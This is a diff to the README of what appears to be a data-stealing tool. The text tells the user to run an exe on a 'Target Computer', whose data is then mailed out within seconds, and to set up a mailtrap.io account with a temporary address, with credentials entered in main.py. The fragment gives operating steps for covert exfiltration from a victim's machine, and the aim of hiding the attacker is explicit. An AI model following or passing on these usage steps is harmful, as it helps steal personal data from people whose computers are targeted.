@@ -11,7 +11,7 @@ Download and run exe file on Target Computer.The data will mail in 5-10 seconds.
 ## USAGE TEMP MAIL
 
 Register an account on this site "https://mailtrap.io/" using a temp mail.
-Get the Username,Password and put them in the "main.py" username and password part.Set E-MAIL to your Temp Mail.
+Get the Username,Password and put them in the "main.py" username and password part.
 
 ![github-small](/images/dene.png)
 
@@ -35,7 +35,7 @@ pip install glob
 
 ## USAGE
 
-•**Set your own MAIL,USERNAME PASSWORD on "main.py".**
+•**Set your own USERNAME and PASSWORD on "main.py".**
 
 ![github-small](/images/pass.png)
 
